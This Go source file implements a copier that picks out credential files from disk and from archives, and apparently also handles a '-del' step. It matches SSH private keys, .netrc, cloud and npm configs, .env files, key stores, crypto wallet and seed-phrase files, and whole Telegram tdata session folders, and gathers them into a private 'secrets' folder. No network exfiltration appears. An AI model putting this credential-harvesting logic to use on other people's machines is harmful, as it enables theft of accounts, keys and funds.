package sflog

import (
	"context"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
)

const defaultEnvCopyMaxLen = 16 << 20 // 16 MiB

// tdataCopyMaxBytes is the whole-tree cap for a Telegram tdata copy. A tree
// that would exceed this is skipped (no partial dest, no -del). Tests may
// lower it.
var tdataCopyMaxBytes int64 = 5 << 30

var errTdataOverCap = errors.New("tdata folder exceeds 5 GiB copy limit")

// envCopyBasenames is the high-confidence allowlist for -env file copy.
var envCopyBasenames = map[string]bool{
	"id_rsa": true, "id_dsa": true, "id_ecdsa": true, "id_ed25519": true,
	".netrc": true, ".pgpass": true, ".htpasswd": true,
	".git-credentials": true, ".npmrc": true, ".pypirc": true, ".dockercfg": true,
	".boto": true, ".s3cfg": true,
	"credentials": true, "credentials.json": true, "credentials.xml": true,
	"secrets.json": true, "secret.json": true,
	"apikeys.json": true, "api_keys.json": true,
	"service_account.json": true, "service-account.json": true,
	"token.json": true, "tokens.json": true, "auth.json": true,
	"wallet.dat": true, "seed.txt": true, "mnemonic.txt": true, "recovery.txt": true,
}

var envCopyExtensions = map[string]bool{
	".pem": true, ".key": true, ".ppk": true, ".p12": true, ".pfx": true,
	".kdbx": true, ".asc": true, ".ovpn": true, ".env": true, ".properties": true,
}

var envCopyConditionalExts = map[string]bool{
	".json": true, ".yaml": true, ".yml": true, ".ini": true,
	".toml": true, ".cfg": true, ".conf": true,
}

var envCopyBasenameTokens = []string{
	"credential", "secret", "apikey", "api_key", "token",
	"serviceaccount", "firebase", "appsettings",
}

// isEnvCopyCandidate reports whether path should be copied under -env.
func isEnvCopyCandidate(path string) bool {
	name := strings.ToLower(filepath.Base(path))
	if strings.HasSuffix(name, ".pub") {
		return false
	}
	if envCopyBasenames[name] {
		return true
	}
	if name == ".env" || strings.HasPrefix(name, ".env.") {
		return true
	}
	ext := filepath.Ext(name)
	if envCopyExtensions[ext] {
		return true
	}
	if envCopyConditionalExts[ext] {
		lower := strings.ToLower(strings.TrimSuffix(name, ext))
		for _, tok := range envCopyBasenameTokens {
			if strings.Contains(lower, tok) {
				return true
			}
		}
	}
	return false
}

// safeRelPath sanitizes a relative path for writing under a secrets/staging
// root. Absolute, UNC, and Windows volume prefixes (C:) are stripped so
// filepath.Join(root, rel) cannot discard root on Windows. ".." and empty
// parts are dropped; leftover drive-like elements containing ':' are skipped.
func safeRelPath(rel string) string {
	s := strings.ReplaceAll(rel, "\\", "/")
	for strings.HasPrefix(s, "/") {
		s = s[1:]
	}
	parts := strings.Split(s, "/")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" || p == "." || p == ".." {
			continue
		}
		if strings.Contains(p, ":") {
			continue
		}
		out = append(out, sanitizePathElem(p))
	}
	if len(out) == 0 {
		return "_"
	}
	return filepath.Join(out...)
}

// destUnderRoot reports whether dest is root or a path inside it. Both are
// cleaned; a trailing separator on root prevents /secrets matching /secrets-evil.
func destUnderRoot(root, dest string) bool {
	root = filepath.Clean(root)
	dest = filepath.Clean(dest)
	if dest == root {
		return true
	}
	sep := string(filepath.Separator)
	if !strings.HasSuffix(root, sep) {
		root += sep
	}
	return strings.HasPrefix(dest, root)
}

func sanitizePathElem(s string) string {
	var b strings.Builder
	for _, r := range s {
		if r == '/' || r == '\\' || r == 0 {
			continue
		}
		b.WriteRune(r)
	}
	if b.Len() == 0 {
		return "_"
	}
	return b.String()
}

// EnvCopyStats holds final -env copy counters.
type EnvCopyStats struct {
	Copied, SkippedOverCap, WriteErrors int
	// DirsCopied counts Telegram tdata folders copied whole (loose or promoted
	// from archive staging). Copied counts only flat env/key files.
	DirsCopied int
	// DirsSkippedOverCap counts tdata folders skipped for exceeding
	// tdataCopyMaxBytes. Distinct from SkippedOverCap (flat env/key files).
	DirsSkippedOverCap int
}

type envJob struct {
	srcPath    string // loose on-disk file (empty for archive members)
	data       []byte // in-memory bytes (archive members)
	memberName string // in-archive path (archive members)
}

// EnvCopier asynchronously copies env/key files flat into root
// (<out>/sfl_<stamp>_secrets/).
type EnvCopier struct {
	root    string
	prog    *Progress
	maxLen  int64
	queue   chan envJob
	wg      sync.WaitGroup
	started atomic.Bool

	mu    sync.Mutex
	stats EnvCopyStats
	// dirMu guards destination directory naming for recursive tdata copies
	// (CopyDir / PromoteTdata) since multiple archive workers may finish
	// confirmed tdata trees concurrently. The file-copy path is already
	// serialized on the single worker goroutine.
	dirMu sync.Mutex
}

// NewEnvCopier creates a copier writing flat into root. The directory is
// created lazily on the first successful write so an empty run leaves nothing
// behind.
func NewEnvCopier(root string, prog *Progress, maxLen int64) *EnvCopier {
	if maxLen <= 0 {
		maxLen = defaultEnvCopyMaxLen
	}
	return &EnvCopier{
		root:   root,
		prog:   prog,
		maxLen: maxLen,
		queue:  make(chan envJob, 256),
	}
}

// Start launches the background copy worker.
func (c *EnvCopier) Start() {
	if c == nil || c.started.Swap(true) {
		return
	}
	c.wg.Add(1)
	go c.worker()
}

// EnqueueFile queues a loose on-disk file for async copy.
func (c *EnvCopier) EnqueueFile(srcPath string) {
	if c == nil {
		return
	}
	info, err := os.Lstat(srcPath)
	if err != nil {
		c.bumpWriteError()
		return
	}
	if info.Mode()&os.ModeSymlink != 0 || !info.Mode().IsRegular() {
		c.bumpWriteError()
		return
	}
	if info.Size() > c.maxLen {
		c.bumpSkippedOverCap()
		return
	}
	c.queue <- envJob{srcPath: srcPath}
}

func (c *EnvCopier) enqueueEnvBytes(memberName string, data []byte) {
	if c == nil || len(data) == 0 {
		return
	}
	if int64(len(data)) > c.maxLen {
		c.bumpSkippedOverCap()
		return
	}
	c.queue <- envJob{memberName: memberName, data: data}
}

// CopyDir copies a loose tdata tree into <root>/tdata/ (with _2/_3 suffixes)
// synchronously so the caller can set -del eligibility from the outcome.
func (c *EnvCopier) CopyDir(srcDir string) error {
	if c == nil {
		return os.ErrInvalid
	}
	dest, err := c.reserveTdataDest()
	if err != nil {
		c.bumpWriteError()
		c.removeRootIfEmpty()
		return err
	}
	var used int64
	n, err := copyTree(srcDir, dest, &used)
	if err != nil {
		if errors.Is(err, errTdataOverCap) {
			c.bumpSkippedTdataOverCap()
		} else {
			c.bumpWriteError()
		}
		_ = os.RemoveAll(dest)
		c.removeRootIfEmpty()
		return err
	}
	c.creditTdataDir(n)
	return nil
}

// PromoteTdata moves a staged tdata tree into <root>/tdata/ (or tdata_2, …).
// Rename is tried first; any failure (EXDEV, Windows dest-exists) falls back
// to copyTree into the reserved dest, then the staging tree is removed.
func (c *EnvCopier) PromoteTdata(stagedDir string) error {
	if c == nil {
		return os.ErrInvalid
	}
	dest, err := c.reserveTdataDest()
	if err != nil {
		c.bumpWriteError()
		c.removeRootIfEmpty()
		return err
	}
	if err := os.Rename(stagedDir, dest); err != nil {
		_, copyErr := copyTree(stagedDir, dest, new(int64))
		_ = os.RemoveAll(stagedDir)
		if copyErr != nil {
			if errors.Is(copyErr, errTdataOverCap) {
				c.bumpSkippedTdataOverCap()
			} else {
				c.bumpWriteError()
			}
			_ = os.RemoveAll(dest)
			c.removeRootIfEmpty()
			return copyErr
		}
		c.creditTdataDir(countFiles(dest))
		return nil
	}
	c.creditTdataDir(countFiles(dest))
	return nil
}

// reserveTdataDest claims a unique tdata / tdata_N directory under c.root by
// Mkdir (atomic) while holding dirMu, so concurrent PromoteTdata/CopyDir
// cannot pick the same name. The dest is 0700. Caller owns filling or
// removing it.
func (c *EnvCopier) reserveTdataDest() (string, error) {
	if err := os.MkdirAll(c.root, 0o700); err != nil {
		return "", err
	}
	c.dirMu.Lock()
	defer c.dirMu.Unlock()
	base := filepath.Join(c.root, "tdata")
	if err := os.Mkdir(base, 0o700); err == nil {
		return base, nil
	} else if !os.IsExist(err) {
		return "", err
	}
	for i := 2; i < 1000; i++ {
		candidate := base + "_" + itoa(i)
		err := os.Mkdir(candidate, 0o700)
		if err == nil {
			return candidate, nil
		}
		if !os.IsExist(err) {
			return "", err
		}
	}
	return "", os.ErrInvalid
}

func (c *EnvCopier) creditTdataDir(n int) {
	c.mu.Lock()
	c.stats.DirsCopied++
	c.mu.Unlock()
	if c.prog != nil {
		c.prog.addEnvCopied(int64(n))
	}
}

// CopyMember reads up to maxLen from r and enqueues when name is a candidate.
// Returns true only when bytes were queued for copy. Read errors count as write
// errors and do not enqueue partial data.
func (c *EnvCopier) CopyMember(ctx context.Context, memberName string, r io.Reader) bool {
	if c == nil || !isEnvCopyCandidate(memberName) {
		return false
	}
	max := c.maxLen
	data, err := io.ReadAll(io.LimitReader(r, max+1))
	_, _ = io.Copy(io.Discard, r)
	if err != nil {
		c.bumpWriteError()
		return false
	}
	if len(data) == 0 {
		return false
	}
	if int64(len(data)) > max {
		c.bumpSkippedOverCap()
		return false
	}
	c.enqueueEnvBytes(memberName, data)
	return true
}

func (c *EnvCopier) worker() {
	defer c.wg.Done()
	for job := range c.queue {
		c.writeJob(job)
	}
}

func flatBasename(relDest string) string {
	base := filepath.Base(safeRelPath(relDest))
	if base == "" || base == "." {
		return "_"
	}
	return base
}

func (c *EnvCopier) writeJob(job envJob) {
	var base string
	if job.srcPath != "" {
		base = sanitizePathElem(filepath.Base(job.srcPath))
	} else {
		base = flatBasename(job.memberName)
	}
	// Create the destination dir only when we are about to write. A single
	// worker serializes jobs, so concurrent mkdir races are not a concern.
	// filepath.Join keeps this correct on Windows and Unix.
	if err := os.MkdirAll(c.root, 0o700); err != nil {
		c.bumpWriteError()
		return
	}
	dest, ok := uniquePath(filepath.Join(c.root, base))
	if !ok {
		c.bumpWriteError()
		c.removeRootIfEmpty()
		return
	}
	var err error
	if job.srcPath != "" {
		err = copyFile(job.srcPath, dest)
	} else {
		err = os.WriteFile(dest, job.data, 0o600)
	}
	if err != nil {
		c.bumpWriteError()
		_ = os.Remove(dest) // best-effort; ignore if write never created it
		c.removeRootIfEmpty()
		return
	}
	c.mu.Lock()
	c.stats.Copied++
	c.mu.Unlock()
	if c.prog != nil {
		c.prog.addEnvCopied(1)
	}
}

// removeRootIfEmpty deletes c.root when it exists and contains no entries so a
// failed first write does not leave an empty sfl_*_secrets directory behind.
// Uses Remove (not RemoveAll) and only when empty — safe on Windows and Unix.
func (c *EnvCopier) removeRootIfEmpty() {
	if c == nil || c.root == "" {
		return
	}
	entries, err := os.ReadDir(c.root)
	if err != nil || len(entries) > 0 {
		return
	}
	_ = os.Remove(c.root)
}

func copyFile(src, dest string) error {
	info, err := os.Lstat(src)
	if err != nil {
		return err
	}
	if !info.Mode().IsRegular() {
		return os.ErrInvalid
	}
	in, err := openReadNoFollow(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.OpenFile(dest, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return err
	}
	_, err = io.Copy(out, in)
	closeErr := out.Close()
	return firstErr(err, closeErr)
}

// uniquePath returns a non-existing path by suffixing _2, _3, … before the
// extension (and after the full name for dotfiles like ".env" → ".env_2").
// ok is false when every candidate through _999 already exists — callers must
// not overwrite.
func uniquePath(path string) (string, bool) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return path, true
	}
	ext := filepath.Ext(path)
	base := strings.TrimSuffix(filepath.Base(path), ext)
	dir := filepath.Dir(path)
	if base == "" {
		// Dotfile like ".env": filepath.Ext consumes the whole name as the
		// extension, leaving an empty stem. Suffix the full name instead so
		// ".env" -> ".env_2", not "_2.env".
		base = filepath.Base(path)
		ext = ""
	}
	for i := 2; i < 1000; i++ {
		candidate := filepath.Join(dir, base+"_"+itoa(i)+ext)
		if _, err := os.Stat(candidate); os.IsNotExist(err) {
			return candidate, true
		}
	}
	return "", false
}

func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	var b [20]byte
	pos := len(b)
	for i > 0 {
		pos--
		b[pos] = byte('0' + i%10)
		i /= 10
	}
	return string(b[pos:])
}

// copyTree recursively copies src into dest, returning the number of regular
// files copied. Non-regular nodes (symlinks, fifos, devices) are skipped so
// a planted fifo cannot hang the copier. used tracks bytes of regular files
// copied; exceeding tdataCopyMaxBytes returns errTdataOverCap. Callers wipe
// dest on any error.
func copyTree(src, dest string, used *int64) (int, error) {
	info, err := os.Lstat(src)
	if err != nil {
		return 0, err
	}
	if info.Mode()&os.ModeSymlink != 0 {
		return 0, nil
	}
	if info.IsDir() {
		if err := os.MkdirAll(dest, 0o700); err != nil {
			return 0, err
		}
		entries, err := os.ReadDir(src)
		if err != nil {
			return 0, err
		}
		var n int
		for _, e := range entries {
			s := filepath.Join(src, e.Name())
			d := filepath.Join(dest, sanitizePathElem(e.Name()))
			m, err := copyTree(s, d, used)
			n += m
			if err != nil {
				return n, err
			}
		}
		return n, nil
	}
	if !info.Mode().IsRegular() {
		return 0, nil
	}
	if used != nil && *used+info.Size() > tdataCopyMaxBytes {
		return 0, errTdataOverCap
	}
	if err := copyFile(src, dest); err != nil {
		return 0, err
	}
	if used != nil {
		*used += info.Size()
	}
	return 1, nil
}

// countFiles reports the number of regular files under root (recursive).
func countFiles(root string) int {
	var n int
	_ = filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if info, e := d.Info(); e == nil && info.Mode().IsRegular() {
			n++
		}
		return nil
	})
	return n
}

func (c *EnvCopier) bumpWriteError() {
	c.mu.Lock()
	c.stats.WriteErrors++
	c.mu.Unlock()
}

func (c *EnvCopier) bumpSkippedOverCap() {
	c.mu.Lock()
	c.stats.SkippedOverCap++
	c.mu.Unlock()
}

func (c *EnvCopier) bumpSkippedTdataOverCap() {
	c.mu.Lock()
	c.stats.DirsSkippedOverCap++
	c.mu.Unlock()
}

// Close drains the queue and returns final stats.
func (c *EnvCopier) Close() EnvCopyStats {
	if c == nil {
		return EnvCopyStats{}
	}
	if c.started.Load() {
		close(c.queue)
		c.wg.Wait()
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.stats
}
